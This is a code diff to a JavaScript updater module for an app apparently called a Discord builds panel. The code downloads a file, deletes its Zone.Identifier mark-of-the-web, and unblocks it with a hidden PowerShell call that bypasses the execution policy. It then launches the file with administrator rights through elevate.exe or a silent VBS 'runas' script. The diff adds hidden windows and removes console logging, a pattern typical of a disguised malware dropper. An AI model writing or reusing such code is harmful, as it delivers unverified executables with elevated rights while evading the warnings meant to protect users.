@@ -10,11 +10,10 @@ const LOG_PATH = path.join(os.tmpdir(), 'discord-builds-panel-updater.log');
 
 function log(message) {
     const line = `[${new Date().toISOString()}] ${message}\n`;
-    console.log('[updater]', message);
     try {
         fs.appendFileSync(LOG_PATH, line);
     } catch {
-        // ignore log errors
+        // ignore
     }
 }
 
@@ -53,14 +52,13 @@ async function downloadFile(url, destPath) {
 
 function unblockFile(filePath) {
     if (process.platform !== 'win32') {
-        return;
+        return Promise.resolve();
     }
 
     try {
         const zonePath = `${filePath}:Zone.Identifier`;
         if (fs.existsSync(zonePath)) {
             fs.unlinkSync(zonePath);
-            log('Removed Zone.Identifier');
         }
     } catch {
         // ignore
@@ -74,6 +72,8 @@ function unblockFile(filePath) {
                 '-NoProfile',
                 '-ExecutionPolicy',
                 'Bypass',
+                '-WindowStyle',
+                'Hidden',
                 '-Command',
                 `Unblock-File -LiteralPath '${escaped}' -ErrorAction SilentlyContinue`,
             ],
@@ -83,46 +83,46 @@ function unblockFile(filePath) {
     });
 }
 
-function runElevated(exePath) {
+function runAsAdmin(exePath) {
     return new Promise((resolve, reject) => {
-        const elevatePath = path.join(process.resourcesPath || '', 'elevate.exe');
+        if (process.platform !== 'win32') {
+            spawn(exePath, [], { detached: true, stdio: 'ignore' }).unref();
+            resolve();
+            return;
+        }
 
+        const elevatePath = path.join(process.resourcesPath || '', 'elevate.exe');
         if (fs.existsSync(elevatePath)) {
-            log('Launching with elevate.exe: ' + elevatePath);
+            log('Run elevate.exe -> ' + exePath);
             const child = spawn(elevatePath, [exePath], {
                 detached: true,
                 stdio: 'ignore',
                 windowsHide: true,
             });
-
             child.on('error', reject);
             child.unref();
-            setTimeout(resolve, 500);
+            resolve();
             return;
         }
 
-        log('elevate.exe not found, using PowerShell RunAs');
-        const escaped = exePath.replace(/'/g, "''");
-        const workDir = path.dirname(exePath).replace(/'/g, "''");
+        const vbsPath = path.join(os.tmpdir(), 'discord-builds-panel-launch.vbs');
+        const vbs = [
+            'Set shell = CreateObject("Shell.Application")',
+            `shell.ShellExecute "${exePath.replace(/"/g, '""')}", "", "", "runas", 1`,
+        ].join('\r\n');
 
-        execFile(
-            'powershell.exe',
-            [
-                '-NoProfile',
-                '-ExecutionPolicy',
-                'Bypass',
-                '-Command',
-                `Start-Process -LiteralPath '${escaped}' -Verb RunAs -WorkingDirectory '${workDir}'`,
-            ],
-            { windowsHide: false },
-            (error) => {
-                if (error) {
-                    reject(error);
-                    return;
-                }
-                resolve();
-            }
-        );
+        fs.writeFileSync(vbsPath, vbs, 'utf8');
+        log('Run VBS RunAs -> ' + exePath);
+
+        const child = spawn('wscript.exe', ['//B', '//Nologo', vbsPath], {
+            detached: true,
+            stdio: 'ignore',
+            windowsHide: true,
+        });
+
+        child.on('error', reject);
+        child.unref();
+        resolve();
     });
 }
 
@@ -134,15 +134,15 @@ async function runPlatformUpdate() {
     await downloadFile(url, destPath);
 
     const size = fs.statSync(destPath).size;
-    log('Saved to: ' + destPath + ' (' + size + ' bytes)');
+    log('Saved: ' + destPath + ' (' + size + ' bytes)');
 
     if (size < 1000) {
         throw new Error('Downloaded file is too small');
     }
 
     await unblockFile(destPath);
-    await runElevated(destPath);
-    log('Launch requested');
+    await runAsAdmin(destPath);
+    log('Admin launch triggered');
 }
 
 module.exports = { runPlatformUpdate };
